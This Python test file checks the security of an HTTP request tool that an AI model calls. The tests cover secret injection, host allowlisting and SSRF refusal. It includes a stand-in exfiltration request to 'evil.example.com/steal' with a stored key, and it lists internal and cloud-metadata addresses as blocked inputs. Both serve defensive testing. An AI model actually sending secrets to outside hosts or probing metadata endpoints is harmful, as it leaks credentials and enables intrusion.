# SPDX-FileCopyrightText: Copyright (c) 2026 NVIDIA CORPORATION & AFFILIATES. All rights reserved.
# SPDX-License-Identifier: Apache-2.0
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Tests for the built-in HttpRequestTool.

External network, Redis, and DNS are all faked so the tool logic can be
exercised in isolation. Key invariants:
- a stored secret is resolved by name and injected into the auth header,
- off-allowlist hosts are refused and no request/secret is sent,
- the secret value never appears in the returned ToolResult,
- redirects are disabled,
- large response bodies are persisted and returned as a reference.

The security primitives live in ``api.tools.http_common`` (shared with the
synthesized skill endpoint tools), so DNS and transport are patched there.
"""

import pytest

from api.tools import http_common as http_mod
from api.tools.base import ContentType, _session_id_ctx, _storage_ctx
from api.tools.http_request import HttpRequestTool
from api.storage.memory import InMemoryDataArtifactRepository
from api.storage.service import DataStorageService

SECRET_VALUE = "sk-super-secret-value"


class _FakeSecretMeta:
    def __init__(self, name):
        self.name = name


class FakeSecretStore:
    def __init__(self, mapping):
        self._mapping = mapping
        self.calls: list[tuple[str, str]] = []

    async def get_value(self, session_id, name):
        self.calls.append((session_id, name))
        return self._mapping.get((session_id, name))

    async def list_secrets(self, session_id):
        return [
            _FakeSecretMeta(name)
            for (sid, name) in self._mapping
            if sid == session_id
        ]


class FakeResponse:
    def __init__(self, status_code=200, content=b"{}"):
        self.status_code = status_code
        self.content = content


class FakeAsyncClient:
    """Captures constructor + request args and returns a canned response."""

    last_init_kwargs: dict = {}
    last_request: dict = {}
    response = FakeResponse()
    request_count = 0

    def __init__(self, **kwargs):
        FakeAsyncClient.last_init_kwargs = kwargs

    async def __aenter__(self):
        return self

    async def __aexit__(self, *args):
        return False

    async def request(self, method, url, headers=None, params=None, json=None):
        FakeAsyncClient.request_count += 1
        FakeAsyncClient.last_request = {
            "method": method,
            "url": url,
            "headers": headers or {},
            "params": params,
            "json": json,
        }
        return FakeAsyncClient.response


@pytest.fixture
def env(monkeypatch):
    """Allowlist a test host and neutralize DNS SSRF resolution to a public IP."""
    monkeypatch.setenv("HTTP_TOOL_ALLOWED_HOSTS", "api.test")
    monkeypatch.setattr(
        http_mod.socket,
        "getaddrinfo",
        lambda host, port: [(2, 1, 6, "", ("93.184.216.34", 0))],
    )
    FakeAsyncClient.request_count = 0
    FakeAsyncClient.last_request = {}
    FakeAsyncClient.last_init_kwargs = {}
    FakeAsyncClient.response = FakeResponse()
    monkeypatch.setattr(http_mod.httpx, "AsyncClient", FakeAsyncClient)


def _use_secret_store(monkeypatch, mapping):
    fake = FakeSecretStore(mapping)
    monkeypatch.setattr("api.secret_store.get_secret_session_store", lambda: fake)
    return fake


class TestSecretInjection:
    @pytest.mark.asyncio
    async def test_secret_resolved_by_name_and_injected(self, env, monkeypatch):
        _use_secret_store(monkeypatch, {("sess_1", "NVIDIA_API_KEY"): SECRET_VALUE})
        token = _session_id_ctx.set("sess_1")
        try:
            tool = HttpRequestTool()
            result = await tool.execute(
                {
                    "url": "https://api.test/v1/generate",
                    "method": "POST",
                    "secret_name": "NVIDIA_API_KEY",
                    "json_body": {"x": 1},
                }
            )
        finally:
            _session_id_ctx.reset(token)

        assert FakeAsyncClient.request_count == 1
        assert (
            FakeAsyncClient.last_request["headers"]["Authorization"]
            == f"Bearer {SECRET_VALUE}"
        )
        # Secret must never appear in what goes back to the model.
        assert SECRET_VALUE not in str(result.data)
        assert SECRET_VALUE not in result.to_tool_response()

    @pytest.mark.asyncio
    async def test_redirects_disabled(self, env, monkeypatch):
        _use_secret_store(monkeypatch, {})
        token = _session_id_ctx.set("sess_1")
        try:
            await HttpRequestTool().execute({"url": "https://api.test/x"})
        finally:
            _session_id_ctx.reset(token)
        assert FakeAsyncClient.last_init_kwargs.get("follow_redirects") is False

    @pytest.mark.asyncio
    async def test_missing_secret_errors(self, env, monkeypatch):
        _use_secret_store(monkeypatch, {})
        token = _session_id_ctx.set("sess_1")
        try:
            result = await HttpRequestTool().execute(
                {"url": "https://api.test/x", "secret_name": "ABSENT"}
            )
        finally:
            _session_id_ctx.reset(token)
        assert result.content_type == ContentType.ERROR
        assert FakeAsyncClient.request_count == 0


class TestAllowlist:
    @pytest.mark.asyncio
    async def test_off_allowlist_rejected_no_request_no_secret(self, env, monkeypatch):
        fake = _use_secret_store(monkeypatch, {("sess_1", "KEY"): SECRET_VALUE})
        token = _session_id_ctx.set("sess_1")
        try:
            result = await HttpRequestTool().execute(
                {"url": "https://evil.example.com/steal", "secret_name": "KEY"}
            )
        finally:
            _session_id_ctx.reset(token)

        assert result.content_type == ContentType.ERROR
        assert FakeAsyncClient.request_count == 0
        # Secret was never even resolved.
        assert fake.calls == []


class TestSsrfFailsClosed:
    """An SSRF check that cannot decide refuses, rather than deferring to the allowlist."""

    async def _run(self, monkeypatch, resolver):
        fake = _use_secret_store(monkeypatch, {("sess_1", "KEY"): SECRET_VALUE})
        monkeypatch.setattr(http_mod.socket, "getaddrinfo", resolver)
        token = _session_id_ctx.set("sess_1")
        try:
            result = await HttpRequestTool().execute(
                {"url": "https://api.test/x", "secret_name": "KEY"}
            )
        finally:
            _session_id_ctx.reset(token)
        return result, fake

    @pytest.mark.asyncio
    async def test_unresolvable_host_is_refused(self, env, monkeypatch):
        def fail(host, port):
            raise OSError("Name or service not known")

        result, fake = await self._run(monkeypatch, fail)
        assert result.content_type == ContentType.ERROR
        assert "Could not resolve" in str(result.data)
        assert FakeAsyncClient.request_count == 0
        assert fake.calls == []

    @pytest.mark.asyncio
    async def test_empty_resolution_is_refused(self, env, monkeypatch):
        result, _ = await self._run(monkeypatch, lambda host, port: [])
        assert result.content_type == ContentType.ERROR
        assert FakeAsyncClient.request_count == 0

    @pytest.mark.asyncio
    @pytest.mark.parametrize(
        "address", ["10.0.0.5", "169.254.169.254", "::1", "::ffff:10.0.0.5", "fe80::1%eth0"]
    )
    async def test_non_public_resolution_is_refused(self, env, monkeypatch, address):
        result, _ = await self._run(
            monkeypatch, lambda host, port: [(10, 1, 6, "", (address, 0))]
        )
        assert result.content_type == ContentType.ERROR
        assert FakeAsyncClient.request_count == 0


def test_an_unparseable_address_counts_as_blocked():
    assert http_mod.is_blocked_ip("not-an-ip")
    assert http_mod.is_blocked_ip("::ffff:127.0.0.1")
    assert not http_mod.is_blocked_ip("93.184.216.34")


class TestResponseHandling:
    @pytest.mark.asyncio
    async def test_small_json_returned_inline(self, env, monkeypatch):
        _use_secret_store(monkeypatch, {})
        FakeAsyncClient.response = FakeResponse(200, b'{"ok": true}')
        token = _session_id_ctx.set("sess_1")
        try:
            result = await HttpRequestTool().execute({"url": "https://api.test/x"})
        finally:
            _session_id_ctx.reset(token)
        assert result.content_type == ContentType.JSON
        assert result.data["status_code"] == 200
        assert result.data["body"] == {"ok": True}

    @pytest.mark.asyncio
    async def test_large_body_stored_as_reference(self, env, monkeypatch):
        _use_secret_store(monkeypatch, {})
        big = b'{"data": "' + b"x" * (http_mod.MAX_INLINE_BYTES + 100) + b'"}'
        FakeAsyncClient.response = FakeResponse(200, big)

        repo = InMemoryDataArtifactRepository()
        storage = DataStorageService(repository=repo)

        stoken = _session_id_ctx.set("sess_1")
        dtoken = _storage_ctx.set(storage)
        try:
            result = await HttpRequestTool().execute({"url": "https://api.test/x"})
        finally:
            _session_id_ctx.reset(stoken)
            _storage_ctx.reset(dtoken)

        assert result.content_type == ContentType.DATA_REFERENCE
        ref = result.data
        content, _meta = await storage.retrieve_with_metadata(ref)
        assert content == big
